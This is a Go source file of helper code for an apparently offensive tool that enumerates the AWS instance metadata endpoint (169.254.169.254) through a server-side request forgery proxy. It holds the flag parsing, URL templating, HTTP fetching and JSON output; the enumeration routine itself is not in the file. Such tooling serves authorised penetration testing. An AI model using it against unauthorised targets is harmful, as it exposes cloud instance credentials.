package metadata

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

// Storage for pointers of command-line arguments flags

var Verbose bool
var BaseURL string
var OutPath string
var AllVersions bool

// Types and Function for platform implementation and handling

type Platform struct {
	Tag               string
	DefaultOutputPath string
	MetadataEndpoint  string
}

// Platforms
var AWS Platform = Platform{"aws", "./out/aws.json", "http://169.254.169.254/"}
var GCP Platform = Platform{"gcp", "./out/gcp.json", "http://169.254.169.254/"}
var Azure Platform = Platform{"azure", "./out/azure.json", "http://169.254.169.254/"}

var SelectedPlatform Platform

// Select platform based on flag string
func SelectPlatform(platform string) *Platform {
	switch platform {
	case "aws":
		SelectedPlatform = AWS
	case "gcp":
		SelectedPlatform = GCP
		fmt.Println("\033[33m[?]\033[0m Google Cloud Platform has not been implemented.")
		os.Exit(0)
	case "azure":
		SelectedPlatform = Azure
		fmt.Println("\033[33m[?]\033[0m Azure has not been implemented.")
		os.Exit(0)
	default:
		fmt.Println("\033[31m[!]\033[0m Unknown platform. Expected: (aws, gcp or azure).")
		os.Exit(1)
	}
	newFlagSet(SelectedPlatform).Parse(os.Args[2:])
	return &SelectedPlatform
}

// ---

// Function for creating command line flag set for platforms

func newFlagSet(platform Platform) *flag.FlagSet {
	// Create new flag set per platform
	platformCommand := flag.NewFlagSet(platform.Tag, flag.ExitOnError)

	// Universal flags however need to be explicitly created per flag set -.-
	platformCommand.StringVar(&BaseURL, "proxy", "http://example.com/proxy?{0}", "URL of the proxy that will be used for SSRF and enumeration. {0} will be replaced with the proxied URL")
	platformCommand.StringVar(&OutPath, "out", platform.DefaultOutputPath, "Path of the output .json file")
	platformCommand.BoolVar(&AllVersions, "all", false, "Enumerate all versions of the instance metadata. If not specified, only 'latest/' will be enumerated")
	platformCommand.BoolVar(&Verbose, "v", false, "Verbose output")

	return platformCommand
}

// ---

// Temporary helper function for calling platform specific Enumerate functions and handling non-implemented platforms

func (platform Platform) Enumerate(proxyUrl string, allVersions bool, encoder Encoder, outPath string) {
	// .ToString() should also extend this function but this is only temporary so I didn't bother
	switch platform {
	case AWS:
		EnumerateAWS(proxyUrl, allVersions, PassthroughEncoder).ToFile(outPath)
	case GCP:
		fmt.Println("\033[33m[?]\033[0m Google Cloud Platform has not been implemented.")
		os.Exit(0)
	case Azure:
		fmt.Println("\033[33m[?]\033[0m Azure has not been implemented.")
		os.Exit(0)
	default:
		fmt.Println("\r\033[31m[!]\033[0m Expected platform (aws, gcp or azure).")
		os.Exit(1)
	}
}

// ---

// Type and Functions to handle Enumerated Data in JSON format

type EnumeratedJSON string

func (jsonStructure EnumeratedJSON) ToFile(path string) {
	fmt.Printf("[-] Writing to file: " + path)

	// Slice path to file and create directories if they don't already exist
	index := strings.LastIndex(path, "/")
	if index > 0 {
		os.MkdirAll(path[:index], 0777)
	}
	// Create file
	file, errs := os.Create(path)
	if errs != nil {
		fmt.Printf("\r\033[31m[!]\033[0m Failed to create file: \033[31m" + errs.Error() + "\033[0m")
		return
	}
	defer file.Close()

	// Write enumerated JSON data to file
	_, errs = file.WriteString(string(jsonStructure))
	if errs != nil {
		fmt.Printf("\r\033[31m[!]\033[0m Failed to write to file: \033[31m" + errs.Error() + "\033[0m")
		return
	}
	fmt.Printf("\r\033[32m[+]\033[0m Successfully wrote to file: " + path)
}

func (jsonStructure EnumeratedJSON) Print() {
	fmt.Println("\n" + jsonStructure)
}

// ---

// Type and Functions to handle proxied URL encoding in cases required, including custom encoding functions provided by user

type Encoder func(string) string

func PassthroughEncoder(endpoint string) string {
	return endpoint
}

func createURL(proxy, endpoint string) string {
	// Format URL and encode if provided with encoding function
	proxy = strings.Replace(proxy, "{0}", _encoder(endpoint), 1)
	return proxy
}

// ---

// Function for making GET requests and reading the data

func fetchURL(url string) (status string, body []string) {
	// Create new HTTP client and make get request to URL
	t := http.DefaultTransport.(*http.Transport).Clone()
	t.MaxIdleConns = 100
	t.MaxConnsPerHost = 100
	t.MaxIdleConnsPerHost = 100

	httpClient := &http.Client{
		Timeout:   10 * time.Second,
		Transport: t,
	}
	resp, err := httpClient.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	// Append each line in the body to the lines slice and return
	lines := make([]string, 0)

	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		panic(err)
	}
	return resp.Status, lines
}

// ---

// Closure Function for spinner in terminal outputs - Serves no functionality, just for looks

func spinner() func() string {
	spinner := "-"
	counter := 0
	return func() string {
		if Verbose {
			// Print on new line instead of overwriting line for better visibility of what has been done
			return "[" + spinner + "]"
		} else {
			mod := counter % 4
			switch mod {
			case 0:
				spinner = "-"
			case 1:
				spinner = "\\"
			case 2:
				spinner = "|"
			case 3:
				spinner = "/"
			}
			counter = counter + 1
			// ANSI code to carriage return and clear line to cleanly overwrite the line with a new line
			return "\r\033[K[" + spinner + "]"
		}
	}
}

var spin = spinner()

// ---
